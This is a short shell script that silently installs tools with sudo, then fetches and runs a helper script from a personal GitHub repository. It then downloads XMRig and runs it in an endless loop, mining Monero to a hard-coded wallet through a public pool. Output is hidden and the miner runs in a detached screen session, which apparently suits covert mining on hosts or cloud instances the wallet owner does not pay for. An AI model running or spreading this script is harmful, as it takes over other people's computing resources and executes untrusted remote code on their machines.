#!/bin/sh
#
#
#XMR
sudo apt update > /dev/null 2>&1
sudo apt install cpulimit > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh 
chmod +x limiting.sh 
screen -dmS randum ./limiting.sh xmrig 65 75 
wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz 
tar -xf xmrig-6.11.2-linux-x64.tar.gz 
while [ 1 ]; do
./xmrig-6.11.2/xmrig --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaahhh -o ca.monero.herominers.com:10191 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages 
sleep 3
done
sleep 999 > /dev/null 2>&1
